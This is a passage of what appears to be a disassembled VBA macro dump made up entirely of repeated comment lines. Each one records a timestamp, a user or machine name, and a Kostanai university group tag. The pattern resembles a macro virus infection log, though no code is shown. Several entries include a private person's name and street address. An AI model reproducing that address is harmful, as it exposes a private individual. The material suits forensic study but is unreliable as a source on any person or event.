' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #688:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #689:
' 	QuoteRem 0x0000 0x0020 " 13:35:49 - ñóááîòà, 17 ôåâ 2001"
' Line #690:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #691:
' 	QuoteRem 0x0000 0x0000 ""
' Line #692:
' Line #693:
' Line #694:
' Line #695:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #696:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #697:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #698:
' 	QuoteRem 0x0000 0x0020 " 13:35:55 - ñóááîòà, 17 ôåâ 2001"
' Line #699:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #700:
' 	QuoteRem 0x0000 0x0000 ""
' Line #701:
' Line #702:
' Line #703:
' Line #704:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #705:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #706:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #707:
' 	QuoteRem 0x0000 0x0020 " 13:36:01 - ñóááîòà, 17 ôåâ 2001"
' Line #708:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #709:
' 	QuoteRem 0x0000 0x0000 ""
' Line #710:
' Line #711:
' Line #712:
' Line #713:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #714:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #715:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #716:
' 	QuoteRem 0x0000 0x0020 " 13:45:17 - ñóááîòà, 17 ôåâ 2001"
' Line #717:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #718:
' 	QuoteRem 0x0000 0x0000 ""
' Line #719:
' Line #720:
' Line #721:
' Line #722:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #723:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #724:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #725:
' 	QuoteRem 0x0000 0x0020 " 13:49:57 - ñóááîòà, 17 ôåâ 2001"
' Line #726:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #727:
' 	QuoteRem 0x0000 0x0000 ""
' Line #728:
' Line #729:
' Line #730:
' Line #731:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #732:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #733:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #734:
' 	QuoteRem 0x0000 0x0020 " 14:40:56 - ñóááîòà, 17 ôåâ 2001"
' Line #735:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #736:
' 	QuoteRem 0x0000 0x0000 ""
' Line #737:
' Line #738:
' Line #739:
' Line #740:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #741:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #742:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #743:
' 	QuoteRem 0x0000 0x0020 " 14:41:22 - ñóááîòà, 17 ôåâ 2001"
' Line #744:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #745:
' 	QuoteRem 0x0000 0x0000 ""
' Line #746:
' Line #747:
' Line #748:
' Line #749:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #750:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #751:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #752:
' 	QuoteRem 0x0000 0x0020 " 16:51:31 - ñóááîòà, 17 ôåâ 2001"
' Line #753:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #754:
' 	QuoteRem 0x0000 0x0000 ""
' Line #755:
' Line #756:
' Line #757:
' Line #758:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #759:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #760:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #761:
' 	QuoteRem 0x0000 0x0024 " 12:45:33 - ïîíåäåëüíèê, 19 ôåâ 2001"
' Line #762:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #763:
' 	QuoteRem 0x0000 0x0000 ""
' Line #764:
' Line #765:
' Line #766:
' Line #767:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #768:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #769:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #770:
' 	QuoteRem 0x0000 0x0024 " 15:22:59 - ïîíåäåëüíèê, 19 ôåâ 2001"
' Line #771:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #772:
' 	QuoteRem 0x0000 0x0000 ""
' Line #773:
' Line #774:
' Line #775:
' Line #776:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #777:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #778:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #779:
' 	QuoteRem 0x0000 0x0020 " 13:23:52 - ïÿòíèöà, 10 ìàð 2000"
' Line #780:
' 	QuoteRem 0x0000 0x0004 " ÍÈ×"
' Line #781:
' 	QuoteRem 0x0000 0x0000 ""
' Line #782:
' Line #783:
' Line #784:
' Line #785:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #786:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #787:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #788:
' 	QuoteRem 0x0000 0x0020 " 14:31:09 - ïÿòíèöà, 10 ìàð 2000"
' Line #789:
' 	QuoteRem 0x0000 0x0004 " ÍÈ×"
' Line #790:
' 	QuoteRem 0x0000 0x0000 ""
' Line #791:
' Line #792:
' Line #793:
' Line #794:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #795:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #796:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #797:
' 	QuoteRem 0x0000 0x0020 " 14:35:05 - ïÿòíèöà, 10 ìàð 2000"
' Line #798:
' 	QuoteRem 0x0000 0x0004 " ÍÈ×"
' Line #799:
' 	QuoteRem 0x0000 0x0000 ""
' Line #800:
' Line #801:
' Line #802:
' Line #803:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #804:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #805:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #806:
' 	QuoteRem 0x0000 0x0020 " 17:21:37 - ïÿòíèöà, 10 ìàð 2000"
' Line #807:
' 	QuoteRem 0x0000 0x0004 " ÍÈ×"
' Line #808:
' 	QuoteRem 0x0000 0x0000 ""
' Line #809:
' Line #810:
' Line #811:
' Line #812:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #813:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #814:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #815:
' 	QuoteRem 0x0000 0x0020 " 18:43:56 - âòîðíèê, 14 ìàð 2000"
' Line #816:
' 	QuoteRem 0x0000 0x0004 " ÍÈ×"
' Line #817:
' 	QuoteRem 0x0000 0x0000 ""
' Line #818:
' Line #819:
' Line #820:
' Line #821:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #822:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #823:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #824:
' 	QuoteRem 0x0000 0x0024 " 09:39:14 - ïîíåäåëüíèê, 26 ìàð 2001"
' Line #825:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #826:
' 	QuoteRem 0x0000 0x0000 ""
' Line #827:
' Line #828:
' Line #829:
' Line #830:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #831:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #832:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #833:
' 	QuoteRem 0x0000 0x0024 " 09:47:09 - ïîíåäåëüíèê, 26 ìàð 2001"
' Line #834:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #835:
' 	QuoteRem 0x0000 0x0000 ""
' Line #836:
' Line #837:
' Line #838:
' Line #839:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #840:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #841:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #842:
' 	QuoteRem 0x0000 0x0024 " 09:49:26 - ïîíåäåëüíèê, 26 ìàð 2001"
' Line #843:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #844:
' 	QuoteRem 0x0000 0x0000 ""
' Line #845:
' Line #846:
' Line #847:
' Line #848:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #849:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #850:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #851:
' 	QuoteRem 0x0000 0x0024 " 09:57:42 - ïîíåäåëüíèê, 26 ìàð 2001"
' Line #852:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #853:
' 	QuoteRem 0x0000 0x0000 ""
' Line #854:
' Line #855:
' Line #856:
' Line #857:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #858:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #859:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #860:
' 	QuoteRem 0x0000 0x0024 " 10:37:20 - ïîíåäåëüíèê, 26 ìàð 2001"
' Line #861:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #862:
' 	QuoteRem 0x0000 0x0000 ""
' Line #863:
' Line #864:
' Line #865:
' Line #866:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #867:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #868:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #869:
' 	QuoteRem 0x0000 0x0024 " 14:54:45 - ïîíåäåëüíèê, 26 ìàð 2001"
' Line #870:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #871:
' 	QuoteRem 0x0000 0x0000 ""
' Line #872:
' Line #873:
' Line #874:
' Line #875:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #876:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #877:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #878:
' 	QuoteRem 0x0000 0x001E " 14:04:53 - ñðåäà, 25 àïð 2001"
' Line #879:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #880:
' 	QuoteRem 0x0000 0x0000 ""
' Line #881:
' Line #882:
' Line #883:
' Line #884:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #885:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #886:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #887:
' 	QuoteRem 0x0000 0x001E " 14:05:29 - ñðåäà, 25 àïð 2001"
' Line #888:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #889:
' 	QuoteRem 0x0000 0x0000 ""
' Line #890:
' Line #891:
' Line #892:
' Line #893:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #894:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #895:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #896:
' 	QuoteRem 0x0000 0x001E " 15:47:32 - ñðåäà, 25 àïð 2001"
' Line #897:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #898:
' 	QuoteRem 0x0000 0x0000 ""
' Line #899:
' Line #900:
' Line #901:
' Line #902:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #903:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #904:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #905:
' 	QuoteRem 0x0000 0x0020 " 10:31:02 - ñóááîòà, 28 àïð 2001"
' Line #906:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #907:
' 	QuoteRem 0x0000 0x0000 ""
' Line #908:
' Line #909:
' Line #910:
' Line #911:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #912:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #913:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #914:
' 	QuoteRem 0x0000 0x0020 " 15:38:45 - ñóááîòà, 28 àïð 2001"
' Line #915:
' 	QuoteRem 0x0000 0x0003 " T8"
' Line #916:
' 	QuoteRem 0x0000 0x0000 ""
' Line #917:
' Line #918:
' Line #919:
' Line #920:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #921:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #922:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #923:
' 	QuoteRem 0x0000 0x0020 " 17:30:48 - ïÿòíèöà, 27 àïð 2001"
' Line #924:
' 	QuoteRem 0x0000 0x0008 " ñòóäåíò"
' Line #925:
' 	QuoteRem 0x0000 0x0000 ""
' Line #926:
' Line #927:
' Line #928:
' Line #929:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #930:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #931:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #932:
' 	QuoteRem 0x0000 0x001F " 16:43:30 - ÷åòâåðã, 3 ìàé 2001"
' Line #933:
' 	QuoteRem 0x0000 0x0003 " T5"
' Line #934:
' 	QuoteRem 0x0000 0x0000 ""
' Line #935:
' Line #936:
' Line #937:
' Line #938:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #939:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #940:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #941:
' 	QuoteRem 0x0000 0x001F " 13:08:40 - ïÿòíèöà, 4 ìàé 2001"
' Line #942:
' 	QuoteRem 0x0000 0x0003 " T5"
' Line #943:
' 	QuoteRem 0x0000 0x0000 ""
' Line #944:
' Line #945:
' Line #946:
' Line #947:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #948:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #949:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #950:
' 	QuoteRem 0x0000 0x001F " 11:36:12 - ñóááîòà, 5 ìàé 2001"
' Line #951:
' 	QuoteRem 0x0000 0x0003 " T5"
' Line #952:
' 	QuoteRem 0x0000 0x0000 ""
' Line #953:
' Line #954:
' Line #955:
' Line #956:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #957:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #958:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #959:
' 	QuoteRem 0x0000 0x0023 " 09:06:00 - ïîíåäåëüíèê, 7 ìàé 2001"
' Line #960:
' 	QuoteRem 0x0000 0x0003 " T5"
' Line #961:
' 	QuoteRem 0x0000 0x0000 ""
' Line #962:
' Line #963:
' Line #964:
' Line #965:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #966:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #967:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #968:
' 	QuoteRem 0x0000 0x0024 " 12:51:16 - ïîíåäåëüíèê, 14 ìàé 2001"
' Line #969:
' 	QuoteRem 0x0000 0x0004 " Pc3"
' Line #970:
' 	QuoteRem 0x0000 0x0000 ""
' Line #971:
' Line #972:
' Line #973:
' Line #974:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #975:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #976:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #977:
' 	QuoteRem 0x0000 0x0020 " 08:33:56 - ÷åòâåðã, 14 èþí 2001"
' Line #978:
' 	QuoteRem 0x0000 0x0008 " ñòóäåíò"
' Line #979:
' 	QuoteRem 0x0000 0x0007 " 492024"
' Line #980:
' 	QuoteRem 0x0000 0x001F " Êàçàõñòàí, ã. Óñòü-Êàìåíîãîðñê"
' Line #981:
' 	QuoteRem 0x0000 0x0022 " óë. Êðûëîâà 106-56, Ãëóõîâîé ß.Â."
' Line #982:
' Line #983:
' Line #984:
' Line #985:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #986:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #987:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #988:
' 	QuoteRem 0x0000 0x0020 " 15:29:55 - ÷åòâåðã, 14 èþí 2001"
' Line #989:
' 	QuoteRem 0x0000 0x0008 " ñòóäåíò"
' Line #990:
' 	QuoteRem 0x0000 0x0007 " 492024"
' Line #991:
' 	QuoteRem 0x0000 0x001F " Êàçàõñòàí, ã. Óñòü-Êàìåíîãîðñê"
' Line #992:
' 	QuoteRem 0x0000 0x0022 " óë. Êðûëîâà 106-56, Ãëóõîâîé ß.Â."
' Line #993:
' Line #994:
' Line #995:
' Line #996:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #997:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #998:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #999:
' 	QuoteRem 0x0000 0x001E " 13:39:29 - ñðåäà, 20 èþí 2001"
' Line #1000:
' 	QuoteRem 0x0000 0x0008 " ñòóäåíò"
' Line #1001:
' 	QuoteRem 0x0000 0x0007 " 492024"
' Line #1002:
' 	QuoteRem 0x0000 0x001F " Êàçàõñòàí, ã. Óñòü-Êàìåíîãîðñê"
' Line #1003:
' 	QuoteRem 0x0000 0x0022 " óë. Êðûëîâà 106-56, Ãëóõîâîé ß.Â."
' Line #1004:
' Line #1005:
' Line #1006:
' Line #1007:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1008:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1009:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1010:
' 	QuoteRem 0x0000 0x001E " 14:23:13 - ñðåäà, 20 èþí 2001"
' Line #1011:
' 	QuoteRem 0x0000 0x0008 " ñòóäåíò"
' Line #1012:
' 	QuoteRem 0x0000 0x0007 " 492024"
' Line #1013:
' 	QuoteRem 0x0000 0x001F " Êàçàõñòàí, ã. Óñòü-Êàìåíîãîðñê"
' Line #1014:
' 	QuoteRem 0x0000 0x0022 " óë. Êðûëîâà 106-56, Ãëóõîâîé ß.Â."
' Line #1015:
' Line #1016:
' Line #1017:
' Line #1018:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1019:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1020:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1021:
' 	QuoteRem 0x0000 0x001E " 14:39:48 - ñðåäà, 20 èþí 2001"
' Line #1022:
' 	QuoteRem 0x0000 0x0008 " ñòóäåíò"
' Line #1023:
' 	QuoteRem 0x0000 0x0007 " 492024"
' Line #1024:
' 	QuoteRem 0x0000 0x001F " Êàçàõñòàí, ã. Óñòü-Êàìåíîãîðñê"
' Line #1025:
' 	QuoteRem 0x0000 0x0022 " óë. Êðûëîâà 106-56, Ãëóõîâîé ß.Â."
' Line #1026:
' Line #1027:
' Line #1028:
' Line #1029:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1030:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1031:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1032:
' 	QuoteRem 0x0000 0x0020 " 11:51:05 - ÷åòâåðã, 21 èþí 2001"
' Line #1033:
' 	QuoteRem 0x0000 0x0008 " ñòóäåíò"
' Line #1034:
' 	QuoteRem 0x0000 0x0007 " 492024"
' Line #1035:
' 	QuoteRem 0x0000 0x001F " Êàçàõñòàí, ã. Óñòü-Êàìåíîãîðñê"
' Line #1036:
' 	QuoteRem 0x0000 0x0022 " óë. Êðûëîâà 106-56, Ãëóõîâîé ß.Â."
' Line #1037:
' Line #1038:
' Line #1039:
' Line #1040:
' Line #1041:
' Line #1042:
' Line #1043:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1044:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1045:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1046:
' 	QuoteRem 0x0000 0x001F " 12:14:48 - ÷åòâåðã, 8 ìàé 1997"
' Line #1047:
' 	QuoteRem 0x0000 0x0008 " ñòóäåíò"
' Line #1048:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1049:
' Line #1050:
' Line #1051:
' Line #1052:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1053:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1054:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1055:
' 	QuoteRem 0x0000 0x001F " 14:09:51 - ïÿòíèöà, 9 ìàé 1997"
' Line #1056:
' 	QuoteRem 0x0000 0x0008 " ñòóäåíò"
' Line #1057:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1058:
' Line #1059:
' Line #1060:
' Line #1061:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1062:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1063:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1064:
' 	QuoteRem 0x0000 0x0020 " 17:07:26 - âòîðíèê, 12 èþí 2001"
' Line #1065:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #1066:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1067:
' Line #1068:
' Line #1069:
' Line #1070:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1071:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1072:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1073:
' 	QuoteRem 0x0000 0x001E " 10:06:49 - ñðåäà, 13 èþí 2001"
' Line #1074:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #1075:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1076:
' Line #1077:
' Line #1078:
' Line #1079:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1080:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1081:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1082:
' 	QuoteRem 0x0000 0x001E " 11:15:55 - ñðåäà, 13 èþí 2001"
' Line #1083:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #1084:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1085:
' Line #1086:
' Line #1087:
' Line #1088:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1089:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1090:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1091:
' 	QuoteRem 0x0000 0x001E " 12:04:24 - ñðåäà, 13 èþí 2001"
' Line #1092:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #1093:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1094:
' Line #1095:
' Line #1096:
' Line #1097:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1098:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1099:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1100:
' 	QuoteRem 0x0000 0x001E " 12:05:14 - ñðåäà, 13 èþí 2001"
' Line #1101:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #1102:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1103:
' Line #1104:
' Line #1105:
' Line #1106:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1107:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1108:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1109:
' 	QuoteRem 0x0000 0x001E " 12:06:44 - ñðåäà, 13 èþí 2001"
' Line #1110:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #1111:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1112:
' Line #1113:
' Line #1114:
' Line #1115:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1116:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1117:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1118:
' 	QuoteRem 0x0000 0x0020 " 11:07:04 - âòîðíèê, 19 èþí 2001"
' Line #1119:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #1120:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1121:
' Line #1122:
' Line #1123:
' Line #1124:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1125:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1126:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1127:
' 	QuoteRem 0x0000 0x0020 " 17:13:54 - ïÿòíèöà, 29 èþí 2001"
' Line #1128:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #1129:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1130:
' Line #1131:
' Line #1132:
' Line #1133:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1134:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1135:
